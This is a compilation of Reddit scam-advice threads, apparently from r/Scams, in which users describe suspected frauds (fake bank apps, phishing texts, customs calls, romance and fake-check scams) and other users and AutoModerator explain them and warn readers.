Body: I should have read posts on reddit before I bought ticket with this company. I wanted to share how I handle it and get away from the scam afterward, so that it might be helpful in the future if anyone needed.



In the call, SmartCheapFares said the ticket I originally bought was a "standby" ticket, meaning it was highly likely to get cancelled by Spirit, and if that happened, I won't be refunded nor rescheduled. SmartCheapFares provided an option with an add-up price, which "guarantee" I would get the real ticket from Spirit.



The way I handled it was I hanged up the phone, stopping amuse them. I talked to American Express customer service and told them the story. American Express double checked there are no pending amount with SmartCheapFares, in the queue in their system, and suggested (a) do not talk to them anymore (b) do not reply any of their emails, and American Express ensured that I was not charged and will not be charged in the future. I followed her suggestion and successfully ran away from the scam. Hope no one will get scammed by SmartCheapFares.

Title: www.Merrelldepot.com seems like a scam, not for the fire deals but for the sketchy information
Body: My father sent me this link on messenger and told me he ordered from them yesterday.  When I finally got the chance to look at it today, alarm bells went off.  The contact us portion says the company is in San Francisco, specifically 123 adventure lane and the phone number is (415) 123-4567.  Then when you get to some legalese stuff, everything says Lithuania.  He ordered, paid, it shows the appropriate charge on his credit card to a company in California, but he never got a confirmation email.  Suggestions for a next step?

Title: Walmart Moneycard Scam
Body: Please forgive me, I am a very sleep deprived new mom and I am having trouble putting this together in my brain. Figured I‚Äôd reach out to some smarter people.

I am still repeatedly, getting screwed over from the Equifax breach, last year with my information being run through a mortgage preapproval checker before being used to open a bank account at Bank of America. After that, a fraud alert was placed on all three of my credit accounts.

Today, I received three separate text messages with SMS codes for a two factor authentication from Walmart money card. I assume everything is a scam these days, and there was no actionable link, so I did nothing. I was tending to our baby, and a few hours later found that I received an email with a receipt for a purchase that was made with a MasterCard that does not match the numbers of mine. Since the Walmart money card is a MasterCard, I called them and they confirmed that indeed my information had been used to open an account, but they would not tell me how much money was spent or what Was done with it, including when and how it was opened. They did flag my information for fraud so it cannot be used to reopen that or any other accounts. Immediately placed a freeze on my credit with all three accounts, deleted my Walmart.com account, but I‚Äôm trying to figure out the following:

- how did this account open in the first place? the texts came to me and I did nothing with them.

- I guess I don‚Äôt get why anyone would open a reloadable debit card with my information if my credit/money is not being used?

- I went ahead and started the process for a pin through the IRS to prevent my tax return from being filed

What am I missing??

- Attackers have been making mincemeat of Walmart accounts.  You are not the first or the last.  They compromise your account, and then load it with somebody else's stolen credit card info.
- Congratulations on your new baby!

Sounds like Walmart is particularly sloppy about data security, since they apparently went ahead with a sale even though the 2-factor confirmation didn't happen. That tracks. 

Given that the Equifax breach seems to have hit you hard, you might consider keeping one bank credit card and getting rid of any and all store cards and store online accounts (that is: pay for those things with your bank credit card). Some of them are really sloppy and very easily breached. That way, you can keep your eye on your account more easily. 

FWIW, when it comes to good customer service on fraudulent charges and other such problems, American Express is far better than any other card. Not all merchants accept it, though, because it's more expensive for them.
- Thank you! And thank you for the reply!

I don‚Äôt own any store credit cards and the one credit card we have is an AmEx, who has been amazing with fraudulent charges and customer service. I closed down my Walmart account, but just frustrating that every place you want to buy something from now forces you to make an account. The only reason I had a Walmart account was because I bought a toy for my daughter four months ago and it was the only place that carried it üôÑüôÑüôÑ

Title: Obvious Verizon scam text what's the point?
Body: I got a text message "Important Update: Unauthorized activity reported. The carrier needs your input. Fix it now." And they provided a link to some bogus website with a Verizon logo. They have some blurry looking texts.  "Thank you for contacting support bla bla we have received 47 complaints. etc.. Did you send these texts  click yes or no." I know this is an obvious scam because I have never used Verizon and I don't use this phone for texting anyone ever. It's an old Android flip phone that I use for voice calls only and sometimes I RECEIVE advertising texts.  The text came from an 805 area code and I have since blocked and deleted it. I did not click on the yes or no but I wonder what they hope to gain from this?

- The point is that people DO fall for it, or the scammers would run something else.
- They want money, like any scam. There's about a thousand ways the scam could go once they make contact. The simplest would be "Please pay us a refundable "$X" while we investigate to keep your number active"

Title: Fake Bank app scam - anyway to claim?
Body: Hi all,

I've just been scammed with the fake bank app.

I put a camera for sale on FB. 
A guy contacted me and we arranged to meet in kings cross. He checked the camera and all good. 
He made the payment in the Metrobank app. I didn't receive it. We waited a bit and he said it might be after Metrobank cutoff time and I should get it within 2 hours, we checked online which said it could take this long. I've heard of cutoff time and since he seemed like a normal nice guy I didn't see the red flag. He left with the camera. 
Money hasn't arrived. He left the Facebook chat and deleted his profile. 

I've filed a report with the police. 

Can I claim this under my home contents insurance?

- The scam is he sends you stolen money from a stolen account.  You or him in charge of your account then send it somewhere else.  When the person who had their money stolen finds out they will claw it back.  Your account will then be negative all the money sent to the scammer and the scammer gets away with all your money.  That is if you are lucky.  If you are not lucky you will be charged with crimes.
- Guess who will end up with the bills?

Then guess who will end up with any winnings?
- He's going to deposit stolen money in your account, use them to wager and guess who is going to be holding the can when he disappears. Why would someone send $2,000 in order to get a betting account?
- Money mule!. You end up with stolen money and his gambling debts! He can set up his own account. It is a way of avoiding KYC and laundering cash from illicit activities. Tell him to get lost!
- Scam
- Thanks for the response. I appreciate the explanation. I blocked him and reported his account.
- Smart call. Remember if something is too good to be true....

Title: Facebook add related to savita subramanian stock tips lead to whatsapp messages for stock recommendations from Ellie.
Body: In Mid October 2024 I clicked on a facebook ad which mentioned Savita Subramanian from CNBC regarding stock recommendations.

From there I received whatsapp messages from a person named Ellie (her assistant apparently).  At first I was just watching the messages, not really participating. Eventually I started to try them out with limited capital. Most were small wins (10-15%) and some losses, at the end it was pretty much break even. 

Next they said they will give larger profit recommendations (100-400%) for medium to long term. Of late all the picks seem to be chinese companies listed in the US exchange. It could be they are controlling the demand and supply but not sure. 

When I asked them about the company website they said they are - *P\*P Intelligent Management Company. Our website is currently being upgraded because we have upgraded the diversified investment and client investment advice guide on the system. Once the upgrade is completed, I will send it to you as soon as possible, but you can observe the strength of our organization during this period.*

So far there has been no fees and the only thing asked is a screenshot that the order was placed (it doesnt contain anything regarding by account).

Does anyone know what is the end goal or if this is legit ?  
I am wondering if someone is using Savita's name for their personal gain.

- They're just using her name. All Whatsapp financial groups are scams of some sort, whether pump and dump or outright scams.
- I stopped reading at WhatsApp.  Anything in an ad on Facebook or using WhatsApp is a scam.
- All fb ads are usually scams. Most everything on Whatsapp is a scam (same goes for telegram) unless it's someone you know irl. People offering to help you make money for free are a scam. Offering 100-400% returns are definitely a scam. Most companies will keep their old website up until they change over to a new one and that usually only takes a day. Chinese companies...do I need to say anything? 

Have you invested independently in these companies or did you give them the money to invest for you? If they have your money, it's probably gone. All scammers want is your money.
- No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.
- thanks for confirming
- I invest from my account, no money given to them thus far directly. Not sure if they are affiliated to the recommendations given.
- Good points
- The end goal is exactly what you‚Äôre doing - participate. My question is why? A Facebook ad and WhatsApp? What could be scammier?

What are you thinking?

Title: Fiverr Email Scam - Help
Body: Hello, I just wanted to see if anyone on here could help. I got contacted by a fiverr buyer on one of my gigs.
I gave them my email sadly when I was feeling pretty sleepy, but I then got emails from some dodgy ‚Äòfiverr‚Äô emails, which were spelt with one r so I was suspicious. I didn‚Äôt click on links on these emails and have blocked the email, changed my fiverr account email, and I made sure my multi factor authentication was on. I also changed my password. Should I be ok? I didn‚Äôt click on the links in the emails so I think I should be ok, it was a stupid thing to do but I‚Äôm worried.

- Yeah as long as you didn't log in via their phishing link or added any payment details anywhere you're fine. 

Next time, do not send your email to buyers/scammers. You need to stick to communication on the platform. Doing so is against the terms of service.

[https://community.fiverr.com/forums/topic/231681-warning-for-sharing-email/](https://community.fiverr.com/forums/topic/231681-warning-for-sharing-email/)
- Thanks dude. I‚Äôm new to the site and I didn‚Äôt read the rules thoroughly enough. I‚Äôll be more careful next time. I didn‚Äôt do anything except send them my email, I just ignored and deleted their ‚Äòpayment‚Äô emails and blocked them, I just wasn‚Äôt that sure. Thanks for the help.
- Yep, stay safe and be sure to report that user.

Title: Someone stopped me at the grocery store parking lot and asked for directions to a hotel
Body: I was returning the shopping cart when a Japanese man with a thick accent and a briefcase asked me for directions to a hotel. The hotel was a good 3 miles away, which was strange, but I didn't notice anyone near him and he didn't ask for my phone or anything - he actually had his phone out with the name of the hotel written. Fwiw, he seemed genuine, though I know that doesn't mean much.

Anyways, I did bring out my phone and showed the directions via Google Maps. He never asked to hold my phone or anything, just asked which streets to take, whether it was walkable, and finally, how he could find a taxi, as he didn't have data on his phone. I told him he could find a Starbucks to use wifi to get a taxi/Uber/etc and he was happy about that, and asked where to find a Starbucks. I pointed it out across the intersection, and he seemed very happy, shook my hand and headed off.

I checked my pockets and everything seemed in order, and even slowly drove to the intersection after to verify he was making his way (he was). But it still seemed odd that he'd be in a supermarket 3 miles away from his destination - the only thing I can think of is that there was a metro hub on the other side of the block, and maybe he had gotten off there and gotten lost.

Anyways, felt it was worth checking with you. Bank and card accounts seem fine, but I dunno.

- Uh, this was probably just someone who needed help finding his hotel.
- Good grief. This sounds like a man who was asking for directions to a hotel, nothing more. Are we really that messed up as a society that any interaction with any stranger ever is some kind of scam or other crime? I get being cautious and stranger danger etc etc but posts like this make me think we‚Äôve taken that too far, to the point that some people think EVERY person they don‚Äôt know is inherently suspicious.
- I‚Äôm glad you didn‚Äôt call the police and have this poor guy arrested
- Not everything is a scam. This is not something you needed to run to Reddit and post about.
- You are OK. Just helped a stranger in need.
- Probably nothing to worry about.  Lots of reasons he couldn't find his hotel.  The hotel I work at is on a street that starts with I.  But so many people read that first letter as an L, so they wouldn't be able to find it on their GPS.
- The us uses different frequencies than other countries for 4g and 5g phone service; he may have had a phone that didn't support those frequencies so he had no data service
- Hell, I've been in the lost guy's shoes, both home and abroad. You try to find someone that looks like they might not stab you for help finding your hotel, train, bus, etc.

Not every interaction is a scam. Thanks for helping a lost traveler. You probably were the star of their next call home.
- Middle ground is difficult to hit. Some believe every crap, others are suspicious all the time.
- Thank you for your time. I do think this was just an honest guy who was lost, but I've just come from a string of scam attempts, so I've been on edge lately. I appreciate everyone's help and am glad that I was able to help this man find a connection.
- This is exactly what happened to me when I visited Spain. I had a hell of a time finding my hotel and the street signs were in Catalan rather than Spanish. I wish I had found someone as helpful as OP
- And having been the opposite, an English speaker in Japan, even with fullly functioning data, stuff can be difficult to find. 

I remember wandering around a few blocks in Tokyo trying to find my hotel. Despite Google Maps saying it was right there, I couldn‚Äôt find it. 

Eventually I did find it. The entrance was a nondescript door without any easily visible signage. I had walked past it several times until I finally noticed it.

Believe me, I could‚Äôve saved myself a ton of time by asking a total stranger ‚Äúexcuse me, do you know where hotel XYZ is?‚Äù

And FWIW, any major smart phone released in the last decade should support all frequencies. I have an iPhone and that‚Äôs just not something I think about anymore. Now, whether you have a data plan is a different story.

Title: Weird scammer who couldn't improvise
Body: Got a call the other day; the caller told me he was from customs and that a package that was being sent to me from Mexico had been confiscated because it contained "illegal items like money and drugs". 


I asked him who it was addressed to - he had my full name and address. I asked who it was being sent from - "Maria Sanchez" (the most stereotypical Mexican name possible). "No return address." 


I asked him how much money was in the package. He got frustrated, broke the act, and went "Why do you keep asking all of these questions??" I told him that he was telling me someone sent me something illegal, so I needed information about it. 



He hung up.

- The best solution is to just hang up. 

The second best solution, because it's good practice, is to say "I exercise my right to silence and my right to have an attorney present during questioning," and then shut the fuck up, which drives these scammers incoherent. 

Obligatory:

"Don't talk to the police:" https://m.youtube.com/watch?v=d-7o9xYp7eE

Short version: https://m.youtube.com/watch?v=uqo5RYOp4nQ
- Customs always use expressions like "illegal items LIKE money and drugs". I think they would be a bit more specific...but we already know this was a scam.
- Jesus man, don't make it hard for the guy. Just send all your money.   /s


We must have crossed some sort of checkpoint if scammers are starting to have job angst.
- Pro tip - if cops think you‚Äôre involved in drugs or money laundering, they won‚Äôt call you.
- >I asked him how much money was in the package.

- Scammers really count on people panicking and not questioning their claims. 

It‚Äôs scary how they use personal information, like your name and address, to sound legit. Always remember, real customs or law enforcement agencies don‚Äôt operate this way. 

They‚Äôd send official notices, not random calls!

If anyone gets a call like this, stay calm, ask questions, and never share sensitive details. Also, report these incidents‚Äîit helps spread awareness and protect others.
- Trainee
- Damn, even the quality of scammers is on the decline.  Luckily, the new President is an expert, and will be making scammers great again
- Ooo I'm certain I got one of these too (unless cops do actually show up to arrest me). Tho the guy I got was a little more prepped with a name, badge, and case number. Wanted my name and zip to confirm my identity and claimed he couldn't tell me the name on the file he had in case I wasn't me. Ultimately I refused to even give my name and zip and understood that (allegedly) the case would be passed along to the local sheriff.
- Glad he got frustrated and hung up when you questioned him :D If i got such a call id be horrified they had my name and address.
- Don't try to outwit them. Every interaction risks your information being threaded back through an AI. Just hang up and block.
- Actually the BEST solution is ***not*** to answer unknown calls‚Ä¶
- [removed]
- They send official notes or send a tactical team to your front door. The federal government does not call on the phone. Lol
- Yeah Feds don't pass along cases to the local sheriff I've had that happen a few times. Still haven't been arrested. Lol.
- I was definitely freaked out by that! Tried to stay calm and just keep asking questions, not giving any info or agreeing to anything, but I was a little rattled!
- Unfortunately, this causes me to miss calls from legitimate callers.  Legitimate healthcare agencies, senior homes and related agencies, calls from my employer, restaurant reservations, laboratories regarding bloodwork etc etc.    And with the healthcare stuff, when i call back, it's impossible to get to the person that originally called me.
- True, but OP clearly missed that train.
- Why? I rarely get scam calls, so it's kind of fun to pretend that they got me. I would ignore them if it was a daily thing, but the last one I got was 2 years ago.

- All you can do is try to explain how scammers pass as other people to take advantage from others, and be aware for red flags. Even this is not 100% sure to make him wake up and notice he might be falling for a scam. Im sorry but sometimes even if we try our best people refuse to hear, usually in this situations they feel lonely and scammers know how to use this against their victims very well.
- If you‚Äôre his realtor, just know that his finances are likely very volatile if he is in the grips of a !romance scam. Double check where his money is going and maybe that will open the door to a conversation about the scam potential. Good luck!
- It's the romance scam. You can give him links to the many many posts on this subreddit from people who have been scammed in this way, and suggest that he should not transfer money to her until she comes in person. 

Protect your own exposure - don't get involved in financial transactions with him that could leave you vulnerable. This scam can clean people out and suck in their family and colleagues. Keep a firewall.
- Kinda depends. What kind of client is he to you/what services do you provide for him?
- Yea he sounded very enthusiastic about her. She was supposed to be here from a flight and told him her production company (for a movie) wouldn‚Äôt allow her to come here yet from London.
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Romance scam.

Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

- Thank You.
- Realtor he wants to purchase a home. Saying his he‚Äôs waiting on his wife to come from London.
- I asked to find out how close you are. Often romance scams lead to the victim not even immediate family members, and you "just" being his realtor...

I mean, it's great that you care, but I don't see you succeeding.
- Well sounds like you have experience or knowledge in the situation. I am a vet full of integrity and had to just reach out but thanks I‚Äôll just mind my business.
- If you think trying is the right thing to do, by all means, keep going. I did not mean to discourage you.

Guess I better shut up now.
- Nah didn‚Äôt take it like that. Wouldn‚Äôt want to waste my time if you said it leads to a dead end. I‚Äôll just speak to him and inform him of potential red flags

Title: ICICI Bank Scammers Bank of India.
Body: ICICI

I‚Äôm a victim of Credit Card Scam who has to pay credit card bills in lakhs for fraudulent transactions.

Incident 

-I got a multiple calls from ICICI Bank based on the high transactions in my saving account as salary.

-I wasn‚Äôt interested at all but ICICI bank employees kept insisting me for it.

-The card had good features, I opted for it and got the card by sharing my personal documents and updated information.

üí•üí•üí•üí•üí• Only after few weeks I got a call from someone that I‚Äôve to deactivate the annual charges, he was having all my latest personal details shared to ICICI bank.

This is how they gained my trust and managed to get the application installed on my phone in the name of latest banking app.

Now my phone is compromised and OTPs are fetched automatically.
They did multiple big transactions without any issues.

1. Reported immediately to ICICI bank in branch, ICICI employees were reacting like this is so normal and it‚Äôs okay - weird 

They asked to reach the customer support, complained lodged.

After 7 days they shared an update on the complaint that the transaction is claimed by the merchant (fraudster).

- Why the hell you would do that , customer is 100% genuine 
- Bank is 100 % genuine 
- Scammer is 0 % genuine but everything is in favour of the scammer.

2 . Cyber Crime Support

 - It was reported to cyber crime they are the worst ever people, they were acting like yes it happened and you won‚Äôt get anything back for it. They were not willing to take complaint. I had to do it online. They were pissed about it.

- Cyber Crime department were full of ICICI bank scams every time ~20 I visited.

- it‚Äôs still on open state and they keep behaving like shit , indirectly promoting frauds.

3 . RBI

- Reserve Bank of India this is another shithole of India , I had multiple complaints with them. They take 3-4 months to respond that the transaction was OTP based and we cannot revert that. Actually a copy paste of ICICI bank reply.

Recovery 

- The collection department did worst to me that can‚Äôt post here and I had to pay for the fraudulent transaction.


4 . Modus Operandi 

- The bank promotes and sale the credit cards first and later after issuing the card they are selling the information of customers with High Credit Limits , High Account Balance, Old age people, new customers, new account holders.
- The scammers keep targeting those people from the data received by ICICI banks employees.
- The ICICI Bank who is a very scammer friendly has no option to save you as a customer.
- The bank has no interest in tacking frauds or taking any action on it rather they are more focused if we can push the customer to pay the fraudulent transaction bills.
- The escalation points are government departments RBI , Cyber Crime Support.

ICICI Bank News references showing how Branch Managers , Deputy Managers and other employees are doing rampant fraudulent business and it‚Äôs the very common system.

These fraud involves 

a. Signature Forging.
b. Fixed Deposit Frauds.
c. Proxy Accounts.
d. Personal Information selling.
e. Unauthorised Withdrawals.
f. Unauthorised Balances transactions.
g. Involvement with cyber criminals.
h. Fraud money parking.

Conclusion: Avoid this bank at any cost and don‚Äôt ever do what bank officials/ non official says.
Act as per your requirements.

There are numerous banks and scams are happening but bank acts and they are eliminated, but ICICI bank is the only bank which has been indirectly responsible for these scams.

- Something like this happened to my father also, even though the money was transferred to another ICICI Bank the branch did not freeze it. After the police got involved, they said that the account was frozen but the person took the money out. Very fishy!

Title: Package mail scam????

- This is a scam phone call.

Law enforcement does not call suspects asking if they are guilty and then request gift cards to make the transgression go away.

just block and ignore.
- It wasn‚Äôt the postal service. If it were, it would have been US marshals at your door with handcuffs and a free ride to your next 5 years of personal accommodations.
- Yep it‚Äôs a scam. Ignore.
- "¬†a package that has my info on it had something illegal"

Even if it was legit, don't discuss anything that involves you doing something illegal innocent or not with law enforcement or any other entity other than your own legal counsel.
- It wasn't a real person calling you ... just disregard.

Title: Am I being scammed? UK - gave account and sort code, home address
Body: So these are some messages from this person..
They‚Äôve asked for my home address, bank address, account number and sort code.

I‚Äôve provided all as it‚Äôs all common information. 

(Account number and sort code is generally shared for receiving payments), my home address can easily be found out if anyone wants 1:1 in person teaching and I just gave the general banks head quarters. So I guess now that I type this out, I‚Äôm guessing they know which bank I belong to so they‚Äôd probably make Phishing emails? 

They also have my email and obviously phone number.

Any advice in this situation, please let me know.

- I'm assuming you're actually a tutor?  Are you going to be meeting in person?  Are they local?
- Is that... normal across the pond? I do tutoring and they just do PayPal or cash to pay me
- This is about to become  a !fakecheck scam.  The reason the scammers request the name of your bank is so that they can use a different bank on the check.  This will delay the discovery process.
- Why would they need your bank info for tutoring? Either they can pay by check, cash, or app.
- Is that... normal across the pond? I do tutoring and they just do PayPal or cash to pay me
- Yes it‚Äôs a scam. Only ever need persons name, account number & sort code. Nothing else EVER.
- Yep, I‚Äôm actually a tutor. They are not local. I‚Äôm a fully remote tutor.
- No not normal. Bank transfers just require account number, sort code, and holder's name. No addresses or even bank names needed (branch is inferred by the sort code). This is a scam.
- Hi /u/johnnydlive, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Thank you for replying. In this circumstance what do I do? I‚Äôve cleared all my banks money and sent my overdraft to 0. 

I won‚Äôt be depositing any money in the bank or ATM so I don‚Äôt think it should matter.

Title: Facebook inquiries that go nowhere. Scam?
Body: I‚Äôve had an item for sale on Facebook Marketplace for a while now. What happens is somebody will reach out to me and inquire if it is still for sale or they might ask if I am willing to accept a slightly lower price. I‚Äôll respond and I may or may not get a response and then nothing. Even people that have said they want to buy it, but then never follow up with any further communication.

They‚Äôre not asking for any emails or sending codes or anything like that so it‚Äôs not any of those types of scams. 

I‚Äôm curious if there is some advantage that they are gaining by communicating with me via Facebook Marketplace that I‚Äôm unaware of.

- They're just flakes. Facebook makes it very easy to press a single button to message you with a canned "Hi, is this still available?" or "Would you accept $X?" message and some people hit it, maybe send a response or two and then get bored or find a better item they want
- I can tell you from experience there are a *lot* of flaky people on FB marketplace. Could be part of a !fakepayment scam so watch out for anybody who wants to pay you before they pick it up, only accept cash. But given no responses at all, I'm guessing just flaky people or people who accidentally hit the button that messages you and asks if it's still available. lol
- Could be they reached out to a few people and they bought it from someone else. 

FB Marketplace people are lazy and flaky in general.
- Yeah, I accidentally hit that button on a breast pump once. Boy do I not need a breast pump. lol
- Hi /u/peakpenguins, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

Title: Old lady voicemail legit or scam? "good news, not getting out today, don't need a ride"
Body: Today I received a voicemail that said the following:

"Hi honey, I have good news.  I'm definitely not getting out today, they're hoping tomorrow.  So you don't have to worry about how I'm gonna get home - cause I know I was worried!  So um, I'll talk to you later, love you, bye."

* the caller was an elderly-sounding lady; I would say the implication is that the place she was not "getting out" from was a hospital, not like, jail (it wouldn't have been good news for her to \*not\* be "getting out" today if it was jail)
* it is definitely not someone I know
* the phone number came from the same area code as my own number, but I don't live in that city/state/area code anymore and haven't for 15 years
* the first three digits after the area code are the same as the first three digits of my number \[ex: if my number is (ABC) DEF-GHIJ then this call came from (ABC) DEF-WXYZ]

Is this a scam or a legit wrong number?  If it is a scam, what is the scam?

- Caller having the same area code AND the three #s in my prefix is 999/1000 times a dead giveaway. I've had the same cell # for quite some time and I've never had that prefix on my ID when it wasn't a scam. They assume you'll be drawn in by the familiarity. Of course I'm at the point where any # not in my contacts gets routed immediately to voicemail. If no message it gets deleted and blocked.

- There is a website called prankdial, where you can make free prank phone calls to any number - it makes the called id show as a similar area call - some of the pranks have the caller as an old lady, she talks then pauses for you to respond.  maybe it was someone pranking you.
- That is‚Ä¶what I‚Äôm asking though.

- Fair enough, I certainly wasn‚Äôt going to call it back. Just trying to make sure I‚Äôm arming myself with adequate info on what scams are out there to act defensively in case it escalates, so I thought I would see if this is one folks have seen before.

- Hi /u/Flying_Teapot, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.


**
- If you delete and ignore, it can't escalate. 

If it's a wrong number, the caller will figure it out. It's not like she's standing on a street corner waiting to be picked up, so ignoring it is fine.

- "Sergeant Chad" - we could spend hours just making fun of that.

This sounds exactly like a scam.  If cops need to speak with you, rest assured - beyond any measure of any doubts - the cops WILL show up at your house, your workplace, etc.  They WILL come in person if they really need to speak with you.

If they are calling about a warrant or the like - yeah, no, that's not a thing.  They will just come body-snatch your happy ass up and put you in the pokey.

I've had calls from various detectives, lieutenants, captains, sergeants, US marshal, and so on - all fakes, all scammers.   

They want you?  Trust us: They know where to find you.

Ignore.  Block.
- Scam designed to scare you into paying before they press charges.  

For what?  Missing jury duty, unpaid tolls, or worst of all, ripping the label off your mattress, you vermin.
- Scammer wants to scare you and steal your money. Could be the fake "you missed jury duty" scam. Could be some other scam. Bottom line for all of these: they claim that you did something illegal, and if you pay them with gift cards or crypto, or boxes of cash, then the charges will be dropped. Which is not how police work in the US.

There is no officer, there are no charges. If you decide to follow up, look up the phone number for the police department on their official website, and call. Do not call the number they left on VM, do not Google and call the first number in the search results.

But, you can simply delete and ignore the VM.
- Totally a scam. I was called from the Law Enforcer Agents & told I needs to callback or agents would be sweeping my house, my job, bother my friends & family if they didn‚Äôt hear from me by 6pm Wednesday. 

I didn‚Äôt recognize the number so I didn‚Äôt open the voice mail til Friday that week. Never heard another word & that was 6 years ago.
- This is a common scam.  The police will never give you a head start by letting you know they're gonna come after you.  They also don't receive payment for cancelling a warrant (especially if the payment is in gift cards).

Just block the number.
- Don't talk to cops. Fake, real, doesn't matter. Don't talk to cops.
- Stopped reading at Sergeant Chad. If you fork over any money or anything at all, you get exactly what you deserve. ü§£
- Lot of people of all levels of education have already fallen for the "Digital Arrest" scam in India. They call you and threaten to arrest and defame. They also make video calls with fake cops in costumes showing fake arrest warrants.
- The last time I got a call from a police officer was when my mother died in 2022. He had to go through my RoboKiller screening because I didn‚Äôt recognize the number. He told me that they use numbers that are unidentifiable. I‚Äôm sure it‚Äôs a scam in your case if everything is otherwise okay.
- I get calls like that every day. The number that they call from never matches the number they say to call
- That is a total scam.  They will show up at your door or you will get a certified letter.
- THIS would be the time to go all Sovereign Citizen on them.
- Most likely a scam.  However police do call you.  If they do they identify themselves very clearly.  I had a call from the police at my work telling me that my apartment had been burglarized.  I went home and sure enough the police and my landlord were walking around the apartment building, and mine was one that had been broken into.  Were you a victim or witness to a possible crime?
- [removed]
- Definitely saw references to Sergeant Chad on PornHub
- Wait, ripping the label off your mattress is illegal??üò± How much jail time am I looking at for doing that? üò≠ü§£

I am now more broke than ever, hitting the rock bottom. I just wanted to trade those games for either games I want or for some money to get some food. I really wanted Armored Core 6 or SMT5 with the money I get.

Title: Scammed by a home contractor
Body: Reddit users, looking for help and/or suggestions. I am very new to Reddit. First time to even be on it. I watch Charlotte Dobre which is where I got the idea to post here. I am sure there are many victims of scams, but I haven‚Äôt. I feel dumb, embarrassed, and physically sick to my stomach every time I think about it.¬† I was going to have tile installed in my home. I got several bids, checked them in better business bureau, checked references, even reviews online. The person I decided to go with was local, small company. He quoted a price a few hundred dollars less. However, when I got my quote, it had a different name on the invoice. Same initials as the original business I verified. When I asked, I was told the owner was having health conditions and the contractor was buying the business. When the contract was vague, I verified more & more details to make sure I got what I was going to get in writing. Everything is in writing, either email or text. I provided exact tile, brand & color. I agreed to only pay partial payment upfront. I thought I was covering all my bases. I paid him partial payment so he could pick up tiles. He brought me a sample to make sure this is what I wanted. I explained no, I want what I gave him sample of (Bait & switch). He said there was no way he could do what we agreed with that tile other companies must have measured my home wrong. Then I get ghosted. My error was paying with cashier‚Äôs check. Called the owner of the company that is retiring & he said he is having heath issues but closing business, not selling.

